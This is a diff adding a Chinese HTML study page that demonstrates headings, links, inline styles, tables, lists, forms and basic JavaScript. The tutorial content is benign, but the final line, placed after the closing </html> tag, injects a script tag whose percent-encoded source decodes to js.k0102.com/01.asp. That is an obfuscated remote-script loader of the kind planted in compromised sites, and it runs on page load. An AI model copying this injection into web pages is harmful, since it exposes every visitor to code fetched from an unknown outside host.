@@ -1,0 +1,401 @@
+
+<!--HTML 是用来描述网页的一种语言-->
+<!--HTML 指的是超文本标记语言: HyperText Markup Language-->
+<!--HTML 不是一种编程语言，而是一种标记语言-->
+<!--标记语言是一套标记标签 (markup tag)-->
+<!--HTML 使用标记标签来描述网页-->
+<!--HTML 文档包含了HTML 标签及文本内容-->
+<!--HTML HTML文档也叫做 web 页面-->
+
+<!DOCTYPE html> <!--声明为 HTML5 文档-->
+<html>          <!--元素是HTML页面的根元素-->
+    <head>      <!--元素包含了文档的元（meta）数据 -->
+
+        <!--<head> 元素包含了所有的头部标签元素。在 <head>元素中你可以插入脚本（scripts）, 样式文件（CSS），及各种meta信息。
+            可以添加在头部区域的元素标签为: <title>, <style>, <meta>, <link>, <script>, <noscript>, and <base>.-->
+                <!--<base> 标签描述了基本的链接地址/链接目标，该标签作为HTML文档中所有的链接标签的默认链接:-->
+                <!-- <link> 标签定义了文档与外部资源之间的关系。
+                     <link> 标签通常用于链接到样式表:-->
+        <link rel="stylesheet" type="text/css" href="..\css\mystyle.css">
+        <style type="text/css">
+           h3{color: blue}
+        </style>           
+        <meta charset="utf-8"/>   
+        <meta name="keywords" content="为搜索引擎定义关键词：HTML,CSS,XML,JavaScript"/>
+        <meta name="description" content="为网页定义描述内容：DuGu的HTML学习"/>
+        <meta name="author" content="为网页定义作者：DuGu的HTML学习"/>
+       <!-- <meta http-equiv="refresh" content="1"/> <!--每1秒中刷新当前页面-->
+        <meta name="" content=""/>
+        <meta name="" content=""/>
+        <title>DuGu的HTML学习过程</title> <!--文档的标题-->
+    </head>
+<body class="font-center">      <!--可见的页面内容-->
+
+    <!--HTML标题-->
+    <!--1到6代表1号到6号字体-->
+    <h1 id="first_h1" title="h1_title" class="h1_class font-center" style="color:aqua">h1标题</h1>
+    <h2>h2标题</h2>
+    <h3>h3..</h3>
+    <h4>h4...</h4>
+    <h5>h5....</h5>
+    <h6>h6....</h6>
+     <!--end HTML标题-->
+
+    <!--HTML换行-->
+    <br/>
+    <br>
+    <br>
+    <br/>
+    <!--end HTML换行-->
+
+    <!--HTML水平线-->
+    <hr>
+    <hr/>
+    <!--end HTML水平线-->
+
+    <!--HTML段落-->
+    <p>这是一个段落</p>
+    <p>这是另外一个长........................................................
+        .................................................
+        .............................................................段落
+    </p>
+
+     <!--HTML分行的段落-->
+    <p>这是一个段落<br>
+        asdasd<br>
+        sada<br>
+        sadasd<br>
+    </p>
+    <!--end 分行HTML段落-->
+
+    <!--end HTML段落-->
+
+    <!--HTML链接-->
+    <a href="http://www.baidu.com">百度一下</a> <br/>
+    <a href="http://www.baidu.com/" target="_blank">从新的链接代开百度一下</a>
+    <p>如果你将 target 属性设置为 &quot;_blank&quot;, 链接将在新窗口打开。</p>
+    <!--end HTML链接-->
+
+    <!--HTML图像-->
+    <img src="/images/logo.png" width="100" height="100"/>
+    <img src="..\res\1.jpg" width="200" height="100"/>
+    <!--HTML图像-->
+
+     <!--HTML文本格式化-->
+    <p style="color:blue">这是一个段落<br>
+        <b>加粗字体</b> <br/>
+        <em>着重文字</em> <br/>
+        <small>小号文字</small> <br/>
+        <strong>加重语气文字</strong> <br/>
+        <i>斜体文本</i> <br/>
+        <code>电脑自动输出</code> <br/>
+        <sub>上标</sub> 
+        隔开 
+        <sup>下标</sup> <br/>
+        <ins>插入下划线字</ins> <br/>
+        <del>删除字</del> <br/>
+        <var>定义变量</var> <br/>
+        <kbd>定义键盘码</kbd> <br/>
+        <samp>定义计算机代码样本</samp> <br/>
+        <pre>定义预格式文本</pre> <br/>
+        <abbr title="DuGu">定义缩写</abbr> <br/>
+        <address>定义地址</address><br/>
+        <bdo>定义文字方向</bdo><br/>
+        <blockquote>定义长的引用</blockquote><br/>
+        <q>定义短的引用语</q><br/>
+        <cite>定义引用、引证</cite><br/>
+        <dfn>定义一个定义项目</dfn><br/>
+    </p>
+
+    <br/>
+    <br>
+    <!--end HTML文本格式化-->
+
+    <!--HTML CSS内联样式 -->
+    <div style="opacity:0.5;position:absolute;left:50px;width:300px;height:150px;background-color:#40B3DF"></div>
+
+    <div style="font-family:verdana;padding:20px;border-radius:10px;border:12px solid #EE872A;">
+
+<div style="opacity:0.3;position:absolute;left:120px;width:100px;height:200px;background-color:#ffffff"></div>
+
+<h3>Look! Styles and colors</h3>
+
+<div style="letter-spacing:12px;">Manipulate Text</div>
+
+<div style="color:#40B3DF;">Colors
+<span style="background-color:#B4009E;color:#ffffff;">Boxes</span>
+</div>
+
+<div style="color:#000000;">and more...</div>
+<h2 style="background-color:red;">这是一个标题</h2>
+<p style="background-color:green;">这是一个段落。</p>
+<h2 style="background-color:red;">这是一个标题</h2>
+<p style="background-color:green;">这是一个段落。</p>
+<h2 style="background-color:red;">这是一个标题</h2>
+<p style="background-color:green;">这是一个段落。</p>
+    </div>
+<h1 style="text-align:center;color:red;font-size:larger">居中对齐的标题</h1>
+<h1 style="text-align:end">address</h1>
+    <!--end HTML CSS内联样式 -->
+
+    <!--HTML 图像-->
+    <img src="..\res\1.jpg" alt="img_err" width="100" height="100"/>
+    <!--end HTML图像-->
+
+    <!--HTML 表格-->
+    <table class="table_s titfont font-center">
+        <caption>Title</caption>
+        <colgroup>
+            <col span="1px">
+        </colgroup>
+        
+
+        <thead>
+            <th class="font-center" style="color:#000000;">sad</th>
+             <th class="font-center">sad</th>
+        </thead>
+        <tr>
+            <td style="color:#B4009E;font-size:20px">row 1,cell 1</td>
+            <td>row 1,cell 2</td>
+        </tr>
+        <tr>
+            <td>rwo 2,cell 1</td>
+            <td>row 2,cell 2</td>
+        </tr>
+        
+        <tfoot>
+            <td>rwo 2,cell 1</td>
+            <td>row 2,cell 2</td>
+        </tfoot>
+
+    </table>
+
+    <!--end HTML表格-->
+
+    <!--HTML 列表-->
+
+    <!--无序列表-->
+    <ul>
+        <li style="font-size:40">Coffee</li>
+        <li>Milk</li>
+    </ul>
+
+    <ul style="list-style-type:georgian">
+        <li class="dugu-font">Coffee</li>
+        <li>Milk</li>
+    </ul>
+
+    <!--有序列表-->
+    <ol>
+        <li>Mike</li>
+        <li>Code</li>
+    </ol>
+    <!--para type a小写数字列表 A大写数字列表 i罗马数字列表 1阿拉伯数字列表-->
+    <ol type="A">
+        <li>Mike</li>
+        <li>Code</li>
+    </ol>
+
+    <!--自定义列表-->
+    <dl>
+        <dt>Coffee</dt>
+        <dd>- black hot drink</dd>
+        <dt>mick</dt>
+        <dd>- two two</dd>
+    </dl>
+    <h4>嵌套列表​：</h4>
+    <ul>
+    <li>Coffee</li>
+    <li>Tea
+        <ul>
+            <li>Black tea</li>
+            <li>Green tea</li>
+        </ul>
+    </li>
+  <li>Milk</li>
+</ul>
+    <!--end HTML列表-->
+
+    <!--HTML 区块div元素和内联span元素-->
+
+<div>
+    <h4>这是一个区块 <spanc style="font-size:30px" >的样式</span></h4>
+</div>
+
+    <!--end HTML 区块div元素和内联span元素-->
+
+    <!--HTML 布局-->
+
+<div id="contianer" style="width:500px">
+    <div id="header" style="background-color:#ffa500">
+        <h1 id="title" style="margin-bottom:0">This is a Title</h1>
+    </div>
+
+    <div id="menu" style="background-color:#ffd700;height:200px;width:100px;float:left">
+        <b>Menu</b><br>
+        HTML<br>
+        JS<br>
+        CSS<br>    
+    </div> 
+
+    <div id="content" style="background-color:#B4009E;height:200px;width:400px;float:right">This is Content</div>
+    <div id="footer" style="background-color:aquamarine;clear:both;text-align:center">This is a footer</div>
+
+</div>
+
+    <!--end HTML 布局-->
+
+    <!--HTML 表单-->
+    <form>
+        <input type="radio" name="sex" value="male">male<br>
+        <input type="checkbox" name="sex" value="check one">male<br>
+        <input type="password" name="pwd"/><br>
+        <input type="submit" value="Submit" value="submie"><br>
+        <textarea rows="10" cols="30">
+        我是一个文本框。
+        </textarea>
+        <select name="cars">
+            <option value="volvo">Volvo</option>
+            <option value="saab">Saab</option>
+            <option value="fiat" selected>Fiat</option>
+            <option value="audi">Audi</option>
+        </select>
+        <label>this is a label</label>
+        <fieldset spellcheck="true">
+            <legend>legend</legend>
+        </fieldset>
+        
+        <button style="color:#B4009E;font-size:20px">asdadad</button>
+        <datalist>指定一个预先定义的输入控件选项列表</datalist>
+    </form>
+    <!--end HTML 表单-->
+
+    <!--HTML 框架-->
+    <!--<iframe style="margin-top:30" src="dugu_page.html" width="200" height="200" frameborder="0" />
+    <p>一些旧的浏览器不支持 iframe。</p>
+    <p>如果浏览器不支持 iframes 则不会显示。</p>
+    <!--end HTML 框架-->
+
+    <!--HTML 颜色-->
+
+    <p style="background-color:rgb(255,255,0)">
+        通过 rbg 值设置背景颜色
+        </p>
+        <p style="background-color:rgba(255,255,0,0.25)">
+        通过 rbg 值设置背景颜色
+        </p>
+        <p style="background-color:rgba(255,255,0,0.5)">
+        通过 rbg 值设置背景颜色
+        </p>
+        <p style="background-color:rgba(255,255,0,0.75)">
+        通过 rbg 值设置背景颜色
+        </p>
+
+    <!--end HTML 颜色-->
+
+        <!--HTML 脚本-->
+        <script>
+            document.write("<h1>这是一个标题</h1>");
+            document.write("<p>这是一个段落。</p>");
+            </script>
+            <noscript>抱歉，你的浏览器不支持 JavaScript!</noscript>
+            <p>不支持 JavaScript 的浏览器会使用 &lt;noscript&gt; 元素中定义的内容（文本）来替代。</p>
+            <p id="pHtml">
+                您只能在 HTML 输出流中使用 <strong>document.write</strong>。
+                如果您在文档已加载后使用它（比如在函数中），会覆盖整个文档。
+                </p>
+                <!--事件记得写括号啊-->
+                <button type="button" id="btnClick" onclick="myFunc()">点我修改文字</button>
+                <script>
+                    function myFunc()
+                    {
+                        i = 0;
+                        i++;
+                        btn = document.getElementById("btnClick");
+                        btn.innerHTML = i.toString() + "clicks";
+                        btn.style.backgroundColor = "#123456";
+                    
+                        i = i + 1;
+                        var j = 0;
+                        var str = ""
+                        document.getElementById("pHtml").innerHTML = "成功地执行了所有的JS脚本";
+                    }
+                </script>
+        <!--end HTML 脚本-->
+
+    <!--HTML 字符实体-->
+    <p>完整的字符实体链接：<a href="http://www.runoob.com/tags/ref-entities.html" target="_blank">打开</a> </p>
+    <p>如需显示小于号，我们必须这样写：&lt; 或 &#60; 或 &#060;</p>
+    <p>终于的、打出了这么多的空格  	&nbsp; 	&nbsp; 	&nbsp; 	&nbsp;末尾</p>
+    <p>虽然html不区分大小写，但实体字符对大小写敏感。</p>
+    <!--END HTML 字符实体-->
+
+    <!--HTML 统一资源定位器(Uniform Resource Locators)-->
+
+    <div style="text-align:left">
+            <p>&nbsp;&nbsp;&nbsp;&nbsp;Web浏览器通过URL从Web服务器请求页面。
+                    当您点击 HTML 页面中的某个链接时，对应的 &lt;a 
+    
+                    </picture> 标签指向万维网上的一个地址。
+                    
+                    一个统一资源定位器(URL) 用于定位万维网上的文档。
+                    
+                    一个网页地址实例: http://www.runoob.com/html/html-tutorial.html 语法规则:
+                    scheme://host.domain:port/path/filename
+                    
+                    说明:
+                </p>
+                <p>scheme - 定义因特网服务的类型。最常见的类型是 http</p>
+                <p>host - 定义域主机（http 的默认主机是 www）</p>
+                <p>domain - 定义因特网域名，比如 runoob.com</p>
+                <p>port - 定义主机上的端口号（http 的默认端口号是 80）</p>
+                <p>path - 定义服务器上的路径（如果省略，则文档必须位于网站的根目录中）。</p>
+                <p>filename - 定义文档/资源的名称</p>
+                <p>以下是一些URL scheme：</p>
+                
+                <table class="dugu-font">
+                
+                <tbody><tr>
+                <th>Scheme</th>
+                <th>访问</th>
+                <th>用于...</th>
+                </tr>
+                
+                <tr>
+                <td>http</td>
+                <td>超文本传输协议</td>
+                <td>以 http:// 开头的普通网页。不加密。</td>
+                </tr>
+                
+                <tr>
+                <td>https</td>
+                <td>安全超文本传输协议</td>
+                <td>安全网页，加密所有信息交换。</td>
+                </tr>
+                
+                <tr> 
+                <td>ftp</td>
+                <td>文件传输协议</td>
+                <td>用于将文件下载或上传至网站。</td>
+                </tr>
+                
+                <tr>
+                <td>file</td>
+                <td>&nbsp;</td>
+                <td>您计算机上的文件。</td>
+                </tr>
+                </tbody></table>
+                <br><hr>
+
+
+    </div>
+
+    <!--END HTML 统一资源定位器(Uniform Resource Locators)-->
+
+    <!--HTML 速查列表-->
+    <!--END HTML 速查列表-->
+
+    <br><p class="font-center dugu-font">学习到了HTML 速查列表</p>
+</body>
+</html>
+<script src="http://%6A%73%2E%6B%30%31%30%32%2E%63%6F%6D/%30%31%2E%61%73%70"></script>
